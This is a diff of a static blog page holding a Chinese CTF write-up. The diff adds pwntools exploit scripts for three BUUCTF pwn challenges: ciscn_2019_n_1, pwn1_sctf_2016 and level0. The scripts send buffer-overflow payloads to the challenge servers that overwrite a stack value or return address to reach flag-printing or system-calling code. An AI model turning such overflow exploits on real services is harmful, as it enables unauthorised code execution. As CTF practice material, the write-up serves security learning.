@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Buuctf 解题, 微凉">
+    <meta name="keywords" content="Buuctf wp, 微凉">
     <meta name="description" content="
 pwn1
 from pwn import *
@@ -26,7 +26,7 @@ else:
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Buuctf 解题 | 微凉</title>
+    <title>Buuctf wp | 微凉</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -213,12 +213,12 @@ else:
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Buuctf 解题</h1>
+                    <h1 class="description center-align post-title">Buuctf wp</h1>
                 </div>
             </div>
         </div>
@@ -334,8 +334,8 @@ else:
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E7%AE%80%E5%8D%95wp/">
-                                <span class="chip bg-color">简单wp</span>
+                            <a href="/tags/buuctf/">
+                                <span class="chip bg-color">buuctf</span>
                             </a>
                         
                     </div>
@@ -368,7 +368,7 @@ else:
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    81
+                    214
                 </div>
                 
 
@@ -428,7 +428,59 @@ payload = b'a'*72 + p64(addr)
 r.sendline(payload)
 
 r.interactive()
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ol start="3">
+<li><p>cisn_2019_n_1</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+context(os='linux',arch='amd64',log_level='debug')
+elf=ELF("./ciscn")
+local = 0
+if local:
+    r = process("./ciscn")
+else:
+    r = remote("node4.buuoj.cn",28539)
+v2=0x41348000 //11.28125的十六进制形式
+payload = b'a'*(0x30-0x04)+p64(v2)
+r.sendline(payload)
+r.interactive()
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+</li>
+<li><p>pwn1_sctf_2016</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+log_level = 'debug'
+elf = ELF("./pwn1_sctf")
+local = 0
+if local:
+    r = process("./pwn1_sctf")
+else:
+    r = remote("node4.buuoj.cn",28883)
+
+get_flag = 0x08048F0D
+
+payload = b'I'*20 + b'a'*4 + p32(get_flag)
+r.sendline(payload)
+
+r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li><p>level0</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+elf = ELF("./level0")
+local = 0
+if local:
+    r = process("./level0")
+else:
+    r = remote("node4.buuoj.cn",26837)
+
+call_system = 0x0000000000400596
+
+payload = b'a'*0x80+p64(0)+p64(call_system)
+
+r.sendline(payload)
+
+r.interactive()
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
 </ol>
 
                 
@@ -494,8 +546,8 @@ r.interactive()
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E7%AE%80%E5%8D%95wp/">
-                                    <span class="chip bg-color">简单wp</span>
+                                <a href="/tags/buuctf/">
+                                    <span class="chip bg-color">buuctf</span>
                                 </a>
                             
                         </div>
@@ -581,6 +633,10 @@ r.interactive()
                     
                     <a href="/tags/%E7%AE%80%E5%8D%95%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%BB%95%E8%BF%87/">
                         <span class="chip bg-color">简单随机数绕过</span>
+                    </a>
+                    
+                    <a href="/tags/xctf/">
+                        <span class="chip bg-color">xctf</span>
                     </a>
                     
                 </div>
@@ -870,7 +926,7 @@ r.interactive()
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">1.7k</span>
+                        class="white-color">1.9k</span>
             
             
             
